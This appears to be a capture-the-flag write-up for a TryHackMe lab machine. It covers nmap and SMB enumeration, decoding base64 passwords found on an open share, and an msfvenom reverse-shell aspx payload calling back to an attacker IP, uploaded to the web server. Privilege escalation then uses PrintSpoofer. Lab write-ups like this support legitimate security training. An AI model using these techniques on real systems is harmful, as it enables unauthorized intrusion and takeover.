wafw00f:
----------

NO WAF


Nikto:
--------

No such vulnerablities

NMAP:
```
PORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0

135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-06-22T07:14:02+00:00

49663/tcp open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

smb enumeration:
```
Computer Name : Relevant

$ smbclient -L 10.10.0.156
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
```
```
$ smbclient //10.10.0.156/nt4wrksv
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 26 03:16:04 2020
  ..                                  D        0  Sun Jul 26 03:16:04 2020
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020

                7735807 blocks of size 4096. 5164898 blocks available
smb: \> type passwords.txt
type: command not found
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now
```
```
$ cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

$ echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d
Bob - !P@$$W0rD!123

$ echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d
Bill - Juw4nnaM4n420696969!$$$
```

Then using psexec.py (or, impacket-psexec)


But unable to get any shell with these creds...


Gobuster:
-----------

>for port 80 (http):     Was giving errors =>  No directories, I guess

>for port 49663 (http):	 

Checking with smbclient:


Smbclient:

>Saw that: we can upload file there...=> we have write priv. 

>=> and this server also contain same directory /nt4wrksv => shared directory ...!!

>uploaded a payload: 

>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.112.253 LPORT=4444 -f aspx -o rev.aspx

>to directory /nt4wrksv, in order to get a shell back from target...

NOTE: aspx => because .aspx file is used MS IIS .

```
port 4444 was not working => we took port 53 
==> probably port 4444 was not permitted as metasploit default port number is 4444

I again tried with port 4443 ==> we got a shell
```
### BUT
> When I tried exploit/multi/handler as listener in place of nc , I am not getting any meterpreter shell back 
from target

NOTE: 

we got a shell back and got the user.txt file

> ==> THM{fdk4ka34vk346ksxfr21tg789ktf45}


We used potato attack => PrintSpoofer64.exe 

> webserver directory for windows ==> c:\inetpub\wwwroot\

we uploaded the PrintSpoofer64.exe  to trgt and used it while traversing to c:\inetpub\wwwroot\

--> PrintSpoofer64.exe -i -c cmd


Then find root.txt in desktop directory of Administrator

---> THM{1fk5kf469devly1gl320zafgl345pv}

